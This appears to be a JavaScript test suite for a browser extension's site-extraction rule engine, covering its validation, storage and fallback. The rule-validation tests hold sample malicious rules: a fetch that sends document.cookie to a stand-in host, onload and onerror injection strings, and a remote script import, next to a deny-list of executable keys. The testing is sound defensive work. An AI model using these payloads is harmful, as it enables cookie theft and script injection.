      <div id="js_name">ubb 官方号</div>
      <div class="rich_media_content" id="js_content"><p>${LONG2}</p>
        <img src="" data-src="https://mmbiz.qpic.cn/pic1.png">
        <img data-src="https://mmbiz.qpic.cn/pic2.png"></div>
    </body></html>`,
  },
  {
    name: 'xiaohongshu note',
    url: 'https://www.xiaohongshu.com/explore/66a0',
    rule: 'xiaohongshu',
    marker: '# 今日份的西湖日落',
    html: `<html><head><title>小红书</title></head><body>
      <h1 id="detail-title">今日份的西湖日落</h1>
      <div class="note-image-list">
        <img src="https://sns-webpic-qc.xhscdn.com/2024/one.jpg">
        <img src="https://sns-webpic-qc.xhscdn.com/2024/one.jpg">
        <img src="https://sns-webpic-qc.xhscdn.com/2024/two.jpg">
        <img src="data:image/png;base64,AAAA"></div>
      <div id="detail-desc">这是一段超过十个字的笔记正文描述，用来验证 min_chars 生效。</div>
      <div class="tag-wrap"><a href="/search_result/美食">#美食</a><a href="/search_result/旅行">#旅行</a></div>
      <xh-video-player><video src="blob:https://www.xiaohongshu.com/abc" poster="https://sns-video-hs.xhscdn.com/cover.jpg"></video></xh-video-player>
    </body></html>`,
  },
  {
    name: 'x.com single tweet',
    url: 'https://x.com/ubb/status/1',
    rule: 'twitter',
    marker: 'Engagement: ',
    html: `<html><head><title>Post</title></head><body>
      <article data-testid="tweet">
        <div data-testid="User-Name">ubb @ubbdotdev</div>
        <div data-testid="tweetText">Site rules are data now, not code.</div>
        <div data-testid="tweetPhoto"><img src="https://pbs.twimg.com/media/X.jpg"></div>
        <div data-testid="tweetPhoto"><img src="https://abs.twimg.com/emoji/v1/717.png"></div>
        <div data-testid="videoPlayer"><video src="https://video.x.com/1.mp4" poster="https://pbs.twimg.com/poster.jpg"></video></div>
        <time datetime="2026-10-28T09:00:00.000Z">2h</time>
        <span data-testid="reply_count">3</span><span data-testid="retweet_count">12</span><span data-testid="like_count"></span>
      </article>
      <article data-testid="tweet">
        <div data-testid="User-Name">other @other</div>
        <div data-testid="tweetText">second post ignored by the group block</div>
      </article>
    </body></html>`,
  },
  {
    name: 'x.com timeline (repeat branch)',
    url: 'https://x.com/search?q=ubb',
    rule: 'twitter',
    marker: '@ubb: ',
    html: `<html><head><title>Search</title></head><body>
      <article data-testid="tweet">
        <div data-testid="card.media"><video src="https://video.x.com/promoted.mp4"></video></div>
      </article>
      <article data-testid="tweet">
        <div data-testid="User-Name">ubb · @ubbdotdev · 2h</div>
        <div data-testid="tweetText">Head split on the middot, body text here.</div>
        <div data-testid="tweetPhoto"><img src="https://pbs.twimg.com/media/Y.png"></div>
      </article>
    </body></html>`,
  },
  {
    name: 'unknown host → generic',
    url: 'https://example.com/blog/post',
    rule: 'generic',
    marker: 'generic body text',
    generic: true,
    html: `<html><head><title>Example</title></head><body>
      <nav>menu junk</nav>
      <article class="markdown-body"><p>generic body text lives here</p><img src="https://example.com/i.png"></article>
      <footer>footer junk</footer>
    </body></html>`,
  },
  {
    name: 'github repo but empty shell → generic',
    url: 'https://github.com/ubb/nothing',
    rule: 'generic',
    marker: 'nothing to extract here',
    generic: true,
    html: `<html><head><title>Empty</title></head><body><main><p>nothing to extract here, this shell page carries no repo content at all</p></main></body></html>`,
  },
];

const buildDoc = (fx) => {
  const doc = parseHTML(fx.html);
  makeWindow(doc, fx.url);
  return doc;
};

// ============================================================ 1. wiring / statics
console.log(`\n[1] rule data + engine wiring${RC ? ` (reverse control rc=${RC})` : ''}`);
ok('content/site-rules.json parses', Array.isArray(PACKAGED.rules) && PACKAGED.rules.length === 6, `rules=${PACKAGED.rules?.length}`);
const IDS = ['github', 'zhihu', 'juejin', 'wechat', 'xiaohongshu', 'twitter'];
ok('the six shipped rule ids', PACKAGED.rules.map((r) => r.id).join(',') === IDS.join(','), PACKAGED.rules.map((r) => r.id).join(','));
ok('site-rules.json carries no executable key anywhere', (() => {
  const bad = [];
  const walk = (n, p) => {
    if (Array.isArray(n)) return n.forEach((v, i) => walk(v, `${p}[${i}]`));
    if (!n || typeof n !== 'object') return;
    for (const [k, v] of Object.entries(n)) {
      if (/^(eval|exec|script|function|code|callback|handler|expression|js|html|innerhtml|template|import|require|fetch|on[a-z]+|src|url|href)$/i.test(k)) bad.push(`${p}.${k}`);
      walk(v, `${p}.${k}`);
    }
  };
  walk(PACKAGED.rules, 'rules');
  return bad.length === 0 ? true : (console.log(`      found: ${bad.join(', ')}`), false);
})());

const engineProbe = loadEngine(buildDoc(FIXTURES[0]));
const deep = (v) => JSON.stringify(v);
// key-order-insensitive comparison: the JS constant and the JSON file list their
// keys in different orders all over the place, which is not a content difference
const same = (a, b) => {
  if (a === b) return true;
  if (typeof a !== typeof b || a === null || b === null || typeof a !== 'object') return false;
  if (Array.isArray(a) !== Array.isArray(b)) return false;
  const ka = Object.keys(a).sort();
  const kb = Object.keys(b).sort();
  if (ka.join('|') !== kb.join('|')) return false;
  return ka.every((k) => same(a[k], b[k]));
};
const firstDiff = (a, b, path = '') => {
  if (a === b) return null;
  if (typeof a !== typeof b || a === null || b === null || typeof a !== 'object') return `${path}: ${deep(a)} vs ${deep(b)}`;
  if (Array.isArray(a) !== Array.isArray(b)) return `${path}: array/object mismatch`;
  if (a.length !== undefined && b.length !== undefined && !Array.isArray(a) && a.length !== b.length) return `${path}: length`;
  const keys = [...new Set([...Object.keys(a), ...Object.keys(b)])];
  for (const k of keys) {
    const d = firstDiff(a[k], b[k], `${path}.${k}`);
    if (d) return d;
  }
  return null;
};
ok('DEFAULT_SITE_RULES in bridge.js == content/site-rules.json', same(engineProbe.DEFAULT_SITE_RULES, PACKAGED.rules),
  firstDiff(engineProbe.DEFAULT_SITE_RULES, PACKAGED.rules) || `constant=${engineProbe.DEFAULT_SITE_RULES.map((r) => r.id).join(',')}`);
for (const fn of ['githubExtract', 'zhihuExtract', 'juejinExtract', 'wechatExtract', 'xiaohongshuExtract', 'twitterExtract']) {
  ok(`legacy ${fn}() is gone from bridge.js`, !new RegExp(`function ${fn}\\b`).test(bridgeSrc));
}
const apiBlock = /const api = \{[\s\S]*?\};/.exec(bridgeSrc)?.[0] || '';
for (const opName of ['extractSite', 'siteRulesList', 'siteRulesSet', 'siteRulesCheck']) {
  ok(`bridge.js registers op ${opName}`, new RegExp(`\\b${opName}\\b`).test(apiBlock), 'not in the api table');
}
ok('extractSite accepts a rules[] argument from the SW', /async function extractSite\(\{[^}]*rules[^}]*\} = \{\}\)/.test(bridgeSrc));
ok('bridge-ctl exposes the provider hooks', /export function setSiteRulesProvider/.test(ctlSrc) && /export function invalidateSiteRules/.test(ctlSrc));
ok('bridge-ctl attaches the cache to extractSite when args.rules is absent', /op === 'extractSite' && a && a\.rules == null/.test(ctlSrc));
ok('lib/tools-sites.js installs the provider at import time', /setSiteRulesProvider\(effectiveSiteRules\)/.test(sitesSrc));

// ============================================================ 2. engine ≡ old extractors
console.log('\n[2] rule engine vs the HEAD extractors (per-site fixtures)');

const rc1BrokenRules = () => {
  // --rc=1: point github's title selector at an element no fixture contains
  const rules = JSON.parse(deep(PACKAGED.rules));
  const gh = rules.find((r) => r.id === 'github');
  gh.extract[0].select = '.no-such-repo-name';
  return rules;
};

async function assertEquivalent(fx, rulesOverride) {
  const rules = rulesOverride || JSON.parse(deep(PACKAGED.rules));
  const docNew = buildDoc(fx);
  const engineNew = loadEngine(docNew);
  const docOld = buildDoc(fx);
  const oldApi = loadOld(docOld);
  const maxChars = 50000;
  const now = await engineNew.extractSite({ max_chars: maxChars, rules });
  const before = oldApi.extractSite({ max_chars: maxChars });
  const shape = (r) => deep({ site: r.site, text: r.text, images: r.images, videos: r.videos, url: r.url, title: r.title });
  ok(`${fx.name}: engine output == old extractor`, shape(now) === shape(before),
    shape(now) === shape(before) ? '' : `new=${String(now.text).slice(0, 160)} | old=${String(before.text).slice(0, 160)}`);
  ok(`${fx.name}: matched rule is ${fx.rule}`, now.rule === fx.rule, `got ${now.rule}`);
  ok(`${fx.name}: text contains the expected marker`, String(now.text).includes(fx.marker), `text=${String(now.text).slice(0, 160)}`);
  ok(`${fx.name}: extraction is not vacuous`, String(now.text).trim().length > 20, `len=${String(now.text).trim().length}`);
  return { now, before, engineNew, oldApi };
}

const equiv = {};
for (const fx of FIXTURES) equiv[fx.name] = await assertEquivalent(fx, RC === '1' && fx.name === 'github repo' ? rc1BrokenRules() : undefined);

// the marker/IMG ledger itself must survive: indices line up with images[]
{
  const { now } = equiv['github repo'];
  ok('IMG_N markers match the images[] ledger', now.text.includes('{{IMG_0}}') && now.images.length === 1 && now.images[0].src === 'https://github.com/ubb/repo/raw/a.png',
    deep(now.images));
  ok('shields.io badge excluded exactly like the old extractor', !now.text.includes('shields.io'));
  const issue = equiv['github issue'].now;
  ok('issue branch resets the repo parts (engine reset op)', issue.text.startsWith('# Daemon hangs') && !issue.text.includes('A daemon that drives'), issue.text.slice(0, 120));
  ok('avatar image dropped by the exclude regex', issue.images.length === 1 && issue.images[0].src.includes('uploads/1.png'), deep(issue.images));
  const xhs = equiv['xiaohongshu note'].now;
  ok('xhs dedup + data-uri skip', xhs.images.length === 2 && xhs.text.includes('Tags: #美食 #旅行'), deep(xhs.images));
  ok('xhs blob video keeps the poster + note', xhs.videos.length === 1 && xhs.videos[0].type === 'video-blob' && xhs.videos[0].referer === 'https://www.xiaohongshu.com', deep(xhs.videos));
  const tw = equiv['x.com timeline (repeat branch)'].now;
  ok('twitter repeat branch head split matches the old one', tw.text.includes('@ubb: Head split on the middot'), tw.text.slice(0, 200));
  ok('generic fallback keeps site=generic', equiv['unknown host → generic'].now.site === 'generic' && equiv['github repo but empty shell → generic'].now.site === 'generic');
}

// siteRulesCheck: in-frame selector syntax probe (used by site.rules.validate with a tab)
{
  const doc = buildDoc(FIXTURES[0]);
  const engine = loadEngine(doc);
  const bad = engine.siteRulesCheck({ rules: [{ id: 'github', match: { host_pattern: ['github.com'] }, extract: [{ op: 'text', select: '[[[' }, { op: 'images', within: 'div >', select: 'img' }] }] });
  ok('siteRulesCheck reports unparsable selectors', bad.results.length === 1 && bad.results[0].issues.length === 2, deep(bad));
  const good = engine.siteRulesCheck({ rules: JSON.parse(deep(PACKAGED.rules)) });
  ok('siteRulesCheck passes every shipped selector', good.results.every((r) => r.issues.length === 0 && r.selectors_checked > 0), deep(good).slice(0, 300));
}

// ============================================================ 3. site.rules.validate
console.log('\n[3] site.rules.validate — grammar, selectors, ids, executable fields');

const { installChromeStub } = await import(new URL('testharness.mjs', LIB));
const chrome = installChromeStub();

// a storage/fetch surface lib/testharness.mjs does not provide (kept local: only
// this suite needs a persistence-backed tool)
const disk = new Map();
chrome.storage.local = {
  get: async (keys) => {
    const out = {};
    const list = keys == null ? [...disk.keys()] : Array.isArray(keys) ? keys : [keys];
    for (const k of list) if (disk.has(k)) out[k] = disk.get(k);
    return out;
  },
  set: async (items) => { for (const [k, v] of Object.entries(items)) disk.set(k, JSON.parse(deep(v))); },
  remove: async (keys) => { for (const k of (Array.isArray(keys) ? keys : [keys])) disk.delete(k); },
};
chrome.runtime.getURL = (p) => `chrome-extension://ubb-test/${p}`;
let fetchBroken = false;
globalThis.fetch = async (u) => {
  if (fetchBroken) throw new Error('chrome-extension resources unavailable');
  if (String(u).endsWith('content/site-rules.json')) {
    return { ok: true, status: 200, json: async () => JSON.parse(fs.readFileSync(path.join(ROOT, 'content', 'site-rules.json'), 'utf8')) };
  }
  return { ok: false, status: 404, json: async () => ({}) };
};

// the module is imported after the stubs exist so its top-level provider install
// (and any first-call fetch) runs against this offline world
const sitesMod = await import(new URL('tools-sites.js', LIB));
const tools = new Map();
sitesMod.register({ register: (n, m, f) => tools.set(n, { m, f }) });
const call = (n, p = {}) => tools.get(n).f(p);
const SITE_RULES_KEY = 'ubbSiteRules';

const okRule = {
  id: 'my-blog',
  match: { host_pattern: ['blog.example.com'], path_pattern: '^/posts/', test_selector: 'article.post' },
  referer: 'https://blog.example.com',
  join: '\n',
  normalize: { collapse_blank_lines: true },
  reject: { text_below: 120 },
  extract: [
    { op: 'text', select: 'h1.title', prefix: '# ' },
    { op: 'repeat', select: 'section.blurb', max: 3, min_chars: 10, then: [{ op: 'text', item: true }, { op: 'images', item: true, select: 'img', src_attrs: ['src', 'data-src'], exclude: 'tracking' }] },
    { op: 'group', when: { selector_found: 'aside.paywall', selector_absent: 'aside.paid' }, then: [{ op: 'join_texts', select: 'aside.paywall li', separator: ' / ', emit_on: 'values' }] },
  ],
};

ok('a hand-written rule passes the grammar', sitesMod.validateRules([okRule]).ok === true, deep(sitesMod.validateRules([okRule]).issues));
ok('all six shipped rules pass the grammar', sitesMod.validateRules(PACKAGED.rules).ok === true, deep(sitesMod.validateRules(PACKAGED.rules).issues.slice(0, 3)));
{
  const snapshot = deep(okRule);
  sitesMod.validateRules([okRule]);
  ok('validate never mutates the rules it is given', deep(okRule) === snapshot);
  const before = disk.size;
  await call('site.rules.validate', { rules: [okRule] });
  ok('validate stores nothing', disk.size === before, `disk=${before} -> ${disk.size}`);
}
{
  const r = await call('site.rules.validate', { rules: [okRule] });
  ok('site.rules.validate answers with the report shape', r && r.ok === true && Array.isArray(r.issues) && typeof r.rules === 'number', deep(r).slice(0, 200));
  ok('site.rules.validate without rules[] throws SITE_RULES_MISSING', (await codeOf(() => call('site.rules.validate', {}))) === 'SITE_RULES_MISSING');
  ok('site.rules.validate reports the skipped DOM probe when there is no tab', /no tab_id/.test(deep(r.dom_probe)), deep(r.dom_probe));
}
{
  const bad = { id: 'x', match: { host_pattern: ['a.com'] }, extract: [{ op: 'grab_html', select: 'body' }] };
  const rep = sitesMod.validateRules([bad]);
  ok('unknown op rejected', rep.ok === false && rep.issues.some((i) => i.kind === 'unknown_op'), deep(rep.issues));
}
{
  const rep = sitesMod.validateRules([{ id: 'x', match: { host_pattern: ['a.com'] }, extract: [{ op: 'text', select: 'h1' }], on_success: 'steal()' }]);
  ok('unknown rule-level key rejected', rep.issues.some((i) => i.kind === 'unknown_key' && i.path === 'on_success'), deep(rep.issues));
}
{
  for (const [label, rule] of [
    ['eval', { id: 'evil', match: { host_pattern: ['a.com'] }, eval: 'fetch("https://evil/"+document.cookie)', extract: [{ op: 'text', select: 'h1' }] }],
    ['nested onload', { id: 'evil2', match: { host_pattern: ['a.com'] }, extract: [{ op: 'text', select: 'h1', onload: 'alert(1)' }] }],
    ['deep script', { id: 'evil3', match: { host_pattern: ['a.com'] }, extract: [{ op: 'group', then: [{ op: 'reset', script: 'x' }] }] }],
    ['html sink', { id: 'evil4', match: { host_pattern: ['a.com'] }, extract: [{ op: 'text', select: 'h1', innerHTML: '<img onerror=1>' }] }],
    ['url import', { id: 'evil5', match: { host_pattern: ['a.com'] }, extract: [{ op: 'text', select: 'h1' }], url: 'https://evil/rules.js' }],
  ]) {
    const rep = sitesMod.validateRules([rule]);
    const hit = rep.issues.filter((i) => i.kind === 'executable_field');
    ok(`executable field "${label}" refused (${hit.length} issue${hit.length > 1 ? 's' : ''})`, rep.ok === false && hit.length > 0, deep(rep.issues));
  }
}
{
  const rep = sitesMod.validateRules([{ id: 'x', match: { host_pattern: ['a.com'] }, extract: [{ op: 'text', select: 'div..bad(' }] }]);
  ok('unparsable selector rejected', rep.issues.some((i) => i.kind === 'selector_syntax'), deep(rep.issues));
  const rep2 = sitesMod.validateRules([
    { id: 'x', match: { host_pattern: ['a.com'], path_pattern: '([' }, extract: [{ op: 'text', select: 'h1' }] },
    { id: 'y', match: { host_pattern: ['a.com'] }, extract: [{ op: 'images', select: 'img', exclude: '([' }] },
  ]);
  ok('uncompilable regex fields rejected', rep2.issues.filter((i) => i.kind === 'regex').length === 2, deep(rep2.issues));
}
{
  const rep = sitesMod.validateRules([
    { id: 'dup', match: { host_pattern: ['a.com'] }, extract: [{ op: 'reset' }] },
    { id: 'dup', match: { host_pattern: ['b.com'] }, extract: [{ op: 'reset' }] },
  ]);
  ok('duplicate id rejected', rep.issues.some((i) => i.kind === 'id_conflict' && i.rule === 'dup'), deep(rep.issues));
  ok('a bad id shape rejected', sitesMod.validateRules([{ id: 'has space!', match: { host_pattern: ['a.com'] }, extract: [{ op: 'reset' }] }]).issues.some((i) => i.kind === 'id'));
}
{
  const rep = sitesMod.validateRules([
    { id: 'x', match: {}, extract: [] },
    { id: 'y', match: { host_pattern: '' }, extract: [{ op: 'repeat', select: 'a' }] },
  ]);
  const kinds = rep.issues.map((i) => i.kind);
  ok('empty match/extract + missing then[] rejected', kinds.includes('type') && kinds.includes('shape'), deep(rep.issues));
}

// ============================================================ 4. SW assembly + tools
console.log('\n[4] provider assembly: packaged + user overrides, user wins');

const registry = await import(new URL('tools-extra.js', LIB));
const ctl = await import(new URL('bridge-ctl.js', LIB));
ok('tools-extra registers the site tools into the whole surface', typeof registry.registerExtras === 'function');
{
  const all = new Map();
  registry.registerExtras({ register: (n, m) => all.set(n, m) });
  for (const n of ['site.rules.list', 'site.rules.validate', 'site.rules.reload', 'site.rules.add']) {
    ok(`${n} is in the extension registry`, all.has(n));
    ok(`${n} declares category + description`, !!all.get(n)?.category && !!all.get(n)?.description);
  }
  ok('site.rules.add is marked sensitive (confirm gate)', all.get('site.rules.add')?.sensitive === true);
}
{
  const eff = await sitesMod.effectiveSiteRules();
  ok('effective list == the six builtins, no user rules yet', eff.map((r) => r.id).join(',') === IDS.join(','), eff.map((r) => r.id).join(','));
}
{
  const userGithub = { id: 'github', match: { host_pattern: ['github.com'] }, referer: 'https://github.com', extract: [{ op: 'text', select: 'h1#user-title', prefix: 'USER ' }] };
  disk.set(SITE_RULES_KEY, [userGithub]);
  ctl.invalidateSiteRules();
  const eff = await sitesMod.effectiveSiteRules();
  ok('user rule comes first and shadows the builtin of the same id', eff.length === 6 && eff[0].id === 'github' && eff[0].extract[0].select === 'h1#user-title', `n=${eff.length} first=${deep(eff[0]).slice(0, 120)}`);
  const listed = await call('site.rules.list', {});
  ok('site.rules.list marks the source of every rule', listed.rules[0].source === 'user' && listed.rules.filter((r) => r.source === 'builtin').length === 5, deep(listed.rules.map((r) => [r.id, r.source])));
  ok('site.rules.list counts add up', listed.counts.total === 6 && listed.counts.user === 1 && listed.counts.builtin === 6, deep(listed.counts));
  ok('site.rules.list reads builtin_source from the packaged file', listed.builtin_source === 'packaged-json' && !listed.builtin_error, deep(listed).slice(0, 200));
  // the user override must be what the frame actually extracts with
  const doc = buildDoc(FIXTURES[0]);
  doc.querySelector('body').appendChild((() => { const h = new El('h1'); h.setAttribute('id', 'user-title'); h.appendChild(new Text('user-visible title')); return h; })());
  const engine = loadEngine(doc);
  const r = await engine.extractSite({ max_chars: 50000, rules: await sitesMod.effectiveSiteRules() });
  ok('the user rule wins the match, not the builtin', r.rule === 'github' && r.text.startsWith('USER user-visible title'), deep({ rule: r.rule, text: r.text.slice(0, 120) }));
  disk.delete(SITE_RULES_KEY);
  ctl.invalidateSiteRules();
}
{
  const res = await call('site.rules.reload', {});
  ok('site.rules.reload warms the cache with the assembled set', res.reloaded === true && res.cache === 'warm' && res.ids.join(',') === IDS.join(','), deep(res).slice(0, 220));
  ok('reload leaves the SW cache populated for bridge()', Array.isArray(ctl.getSiteRulesCache()) && ctl.getSiteRulesCache().length === 6);
}
{
  const before = disk.size;
  ok('site.rules.add without confirm throws NEEDS_CONFIRM', (await codeOf(() => call('site.rules.add', { rule: okRule }))) === 'NEEDS_CONFIRM');
  ok('the refused add stored nothing', disk.size === before && !disk.has(SITE_RULES_KEY));
  ok('site.rules.add refuses an executable rule', (await codeOf(() => call('site.rules.add', { rule: { ...okRule, id: 'evil', eval: 'x' }, confirm: true }))) === 'SITE_RULE_INVALID');
  ok('site.rules.add refuses a broken selector', (await codeOf(() => call('site.rules.add', { rule: { id: 'bad', match: { host_pattern: ['a.com'] }, extract: [{ op: 'text', select: '[[[' }] }, confirm: true }))) === 'SITE_RULE_INVALID');
  ok('site.rules.add needs a single object', (await codeOf(() => call('site.rules.add', { rule: [okRule], confirm: true }))) === 'SITE_RULE_INVALID');
  ok('nothing landed from the rejected adds', disk.size === before);
  const added = await call('site.rules.add', { rule: okRule, confirm: true });
  ok('site.rules.add stores the rule and reports the source', added.stored === 'my-blog' && added.source === 'user' && disk.get(SITE_RULES_KEY)[0].id === 'my-blog', deep(added).slice(0, 200));
  ok('site.rules.add invalidates the cache so the next read re-assembles', ctl.getSiteRulesCache() === null);
  const listed = await call('site.rules.list', {});
  ok('the new rule is first in match order', listed.rules[0].id === 'my-blog' && listed.rules[0].source === 'user', deep(listed.rules.slice(0, 2)));
  const dup = await call('site.rules.add', { rule: { ...okRule, referer: 'https://blog.example.com/v2' }, confirm: true });
  ok('re-adding the same id replaces it instead of piling up', dup.replaced === true && disk.get(SITE_RULES_KEY).length === 1 && disk.get(SITE_RULES_KEY)[0].referer.endsWith('/v2'), deep(dup).slice(0, 200));
  const red = await call('site.rules.add', { rule: { id: 'pw', match: { host_pattern: ['a.com'] }, extract: [{ op: 'text', select: 'input[name="password"]', attr: 'value' }] }, confirm: true });
  ok('a stored rule echoes no plaintext back', !JSON.stringify(red).includes('password'), deep(red).slice(0, 200));
  disk.delete(SITE_RULES_KEY);
  ctl.invalidateSiteRules();
}

// ============================================================ 5. bridge attachment
console.log('\n[5] read_site wiring: the assembled set rides every extractSite call');
{
  const frames = [];
  const seen = [];
  chrome.tabs.sendMessage = async (tabId, msg, opts) => {
    seen.push({ op: msg.op, args: msg.args, frameId: opts?.frameId });
    if (msg.op !== 'extractSite') return { ok: true, result: {} };
    const doc = buildDoc(FIXTURES[0]);
    const h = new El('h1');
    h.setAttribute('id', 'user-title');
    h.appendChild(new Text('user-visible title'));
    doc.querySelector('body').appendChild(h);
    const engine = loadEngine(doc);
    frames.push(await engine.extractSite({ max_chars: 50000, rules: msg.args.rules }));
    return { ok: true, result: frames[frames.length - 1], frameId: opts?.frameId, docEpoch: 'test' };
  };
  const { bridge } = ctl;
  const userGithub = { id: 'github', match: { host_pattern: ['github.com'] }, referer: 'https://github.com', extract: [{ op: 'text', select: 'h1#user-title', prefix: 'USER ' }] };
  disk.set(SITE_RULES_KEY, [userGithub]);
  ctl.invalidateSiteRules();
  const out = await bridge(1, 'extractSite', { max_chars: 50000 });
  ok('bridge() attached the SW-assembled rules to the frame call', seen[0]?.args?.rules?.length === 6 && seen[0].args.rules[0].id === 'github' && seen[0].args.rules[0].extract[0].select === 'h1#user-title', deep(seen[0]?.args).slice(0, 160));
  ok('the frame extracted with the user rule, not the builtin', out.rule === 'github' && out.text === 'USER user-visible title', deep({ rule: out.rule, text: String(out.text).slice(0, 80) }));
  ok('the frame call stayed on the main frame', seen[0].frameId === 0);
  // args.rules given explicitly must be respected untouched
  const explicit = [{ id: 'only', match: { host_pattern: ['github.com'] }, extract: [{ op: 'text', select: 'h1', prefix: 'X ' }] }];
  await bridge(1, 'extractSite', { rules: explicit });
  ok('an explicit rules[] argument is not overwritten', seen[1]?.args?.rules === explicit);
  ok('a non-extractSite op never gets rules attached', (await bridge(1, 'getPageText', {}), !seen[2] || seen[2].args.rules === undefined), deep(seen[2]?.args));
  disk.delete(SITE_RULES_KEY);
  ctl.invalidateSiteRules();
}

// ============================================================ 6. degradation
console.log('\n[6] failure must not take read_site down');
{
  fetchBroken = true;
  ctl.invalidateSiteRules();
  const eff = await grab(() => sitesMod.effectiveSiteRules());
  ok('provider throws when the packaged file is unreadable and no user rules exist', !!eff.e && !eff.r, deep(eff).slice(0, 160));
  ok('bridge-ctl keeps the cache empty in that case', ctl.getSiteRulesCache() === null);
  const listed = await call('site.rules.list', {});
  ok('site.rules.list still answers, and says why', listed.builtin_source === 'unavailable' && !!listed.builtin_error && listed.counts.total === 0, deep(listed).slice(0, 220));
  const doc = buildDoc(FIXTURES[0]);
  const engine = loadEngine(doc); // no fetch stub that succeeds → the content side uses its constant
  const r = await engine.extractSite({ max_chars: 50000 });
  ok('read_site still extracts from DEFAULT_SITE_RULES', r.rule === 'github' && r.text.includes('# ubb/repo'), deep({ rule: r.rule, text: String(r.text).slice(0, 80) }));
  const list2 = await engine.siteRulesList();
  ok('the frame reports its builtin source as the constant', list2.builtin_source === 'builtin-constant' && list2.rules.length === 6, deep(list2).slice(0, 200));
  const reloaded = await call('site.rules.reload', {});
  ok('site.rules.reload degrades without throwing', reloaded.reloaded === false && reloaded.cache === 'cold' && /DEFAULT_SITE_RULES/.test(reloaded.note), deep(reloaded).slice(0, 220));
  fetchBroken = false;
  ctl.invalidateSiteRules();
}

// ============================================================ 8. fix13: the undo half
console.log('\n[8] fix13: site.rules.remove / site.rules.clear — chrome.storage.local is the judge');

const rawLayer = () => disk.get(SITE_RULES_KEY); // storage as it stands, nothing filtered
const rawIds = () => (rawLayer() || []).map((r) => (r && typeof r === 'object' ? r.id : String(r)));
const mkRule = (id, host = 'blog.example.com') => ({ id, match: { host_pattern: [host] }, extract: [{ op: 'text', select: 'h1', prefix: `USER ${id} ` }] });
const seed = (...rules) => { disk.set(SITE_RULES_KEY, JSON.parse(deep(rules))); ctl.invalidateSiteRules(); };
const errOf = async (f) => {
  try { return { code: 'NO-THROW', msg: '', ran: await f() }; } catch (e) { return { code: e?.code ?? 'plain throw', msg: String(e?.message || e) }; }
};
{
  const all = new Map();
  registry.registerExtras({ register: (n, m) => all.set(n, m) });
  for (const n of ['site.rules.remove', 'site.rules.clear']) {
    ok(`${n} 通过 tools-extra 进了扩展注册表`, all.has(n), [...all.keys()].filter((k) => k.startsWith('site.')).join(','));
    ok(`${n} 是 sensitive（契约 §4：confirm 闸门）`, all.get(n)?.sensitive === true, deep(all.get(n) || null).slice(0, 120));
    ok(`${n} 的 description 教了 confirm:true 与 chrome.storage.local`,
      /confirm:true/.test(all.get(n)?.description || '') && /chrome\.storage\.local/.test(all.get(n)?.description || ''),
      (all.get(n)?.description || '').slice(0, 120));
  }
  const undoSrc = sitesSrc.slice(sitesSrc.indexOf("R('site.rules.remove'"));
  ok('撤销两条不把 site.rules.reload 说成生效前提（缓存由工具自己作废）',
    !/run site\.rules\.reload to warm/.test(undoSrc), /run site\.rules\.reload/.test(undoSrc) ? undoSrc.slice(0, 200) : '');
  ok('撤销两条都承诺"下一次 read_site 就变了"（描述与实现同一条路）',
    /invalidated/.test(undoSrc) && /read_site/.test(undoSrc));
}
{
  seed(mkRule('fix13-a'), mkRule('github'));
  const snap = deep(rawLayer());
  const noConfirm = await errOf(() => call('site.rules.remove', { id: 'fix13-a' }));
  ok('remove 不带 confirm → NEEDS_CONFIRM', noConfirm.code === 'NEEDS_CONFIRM', deep(noConfirm).slice(0, 160));
  ok('闸门拒掉的 remove 一个字都没改 storage', deep(rawLayer()) === snap, deep(rawIds()));
  const gates = await Promise.all([
    errOf(() => call('site.rules.remove', { id: 'fix13-a', confirm: false })),
    errOf(() => call('site.rules.remove', { id: 'fix13-a', confirm: 'true' })),
    errOf(() => call('site.rules.remove', { id: 'fix13-a', confirm: 1 })),
  ]);
  ok('confirm:false / "true" / 1 都过不了闸门（只认真 true）',
    gates.every((g) => g.code === 'NEEDS_CONFIRM') && deep(rawLayer()) === snap, deep(gates.map((g) => g.code)));
  const clearGate = await errOf(() => call('site.rules.clear', {}));
  ok('clear 不带 confirm → NEEDS_CONFIRM，整层一个字没动', clearGate.code === 'NEEDS_CONFIRM' && deep(rawLayer()) === snap, deep(clearGate).slice(0, 160));
  const badId = await errOf(() => call('site.rules.remove', { id: 'has space!', confirm: true }));
  ok('remove 的 id 形状不对 → BAD_PARAMS，不带 storage 写入', badId.code === 'BAD_PARAMS' && deep(rawLayer()) === snap, deep(badId).slice(0, 160));
  const noId = await errOf(() => call('site.rules.remove', { confirm: true }));
  ok('remove 少了 id 也是 BAD_PARAMS（空 id 不许被当成"全删"）', noId.code === 'BAD_PARAMS' && deep(rawLayer()) === snap, deep(noId).slice(0, 160));
}
{
  seed(mkRule('fix13-a'), mkRule('fix13-b'));
  const warm = await call('site.rules.reload', {});
  ok('起点：warm 缓存里是 2 条用户 + 6 条 builtin（无同 id，共 8）', warm.total === 8 && warm.cache === 'warm', deep({ total: warm.total, cache: warm.cache }));
  const ghost = await errOf(() => call('site.rules.remove', { id: 'nosuchrule', confirm: true }));
  ok('未命中：SITE_RULE_NOT_FOUND，说的是"本来就没有"（不返回 removed:0 那种谎）',
    ghost.code === 'SITE_RULE_NOT_FOUND' && /nothing was removed/.test(ghost.msg) && /fix13-a, fix13-b/.test(ghost.msg), ghost.msg.slice(0, 200));
  ok('未命中不写 storage、不作废缓存', deep(rawIds()) === '["fix13-a","fix13-b"]' && ctl.getSiteRulesCache()?.length === 8, deep({ ids: rawIds(), cache: ctl.getSiteRulesCache()?.length }));
  const builtinDirect = await errOf(() => call('site.rules.remove', { id: 'zhihu', confirm: true }));
  ok('删 builtin 要红并点名它来自打包文件（可删的是同 id 的用户覆盖）',
    builtinDirect.code === 'SITE_RULE_NOT_FOUND' && /PACKAGED/.test(builtinDirect.msg) && deep(rawIds()) === '["fix13-a","fix13-b"]', builtinDirect.msg.slice(0, 160));
  const hit = await call('site.rules.remove', { id: 'fix13-a', confirm: true });
  ok('命中：removed + removed_layer_entries 与 storage 真少掉的条数一致',
    hit.removed === 'fix13-a' && hit.removed_layer_entries === 1 && rawIds().join(',') === 'fix13-b', deep(hit).slice(0, 220));
  ok('命中：另一条留在 storage 里一字未改（remove 不许顺手清别的）', deep(rawLayer()) === deep([mkRule('fix13-b')]), deep(rawLayer()).slice(0, 200));
  ok('命中：缓存当场作废，下一次 read_site 重新装配', ctl.getSiteRulesCache() === null && hit.cache === 'cold', deep(ctl.getSiteRulesCache()));
  ok('命中：没有同 id builtin 时不谎称 builtin 回来了',
    hit.was_shadowing_builtin === undefined && hit.builtin_now_effective === undefined && /no extension reload/.test(hit.note), deep(hit).slice(0, 200));
}
{
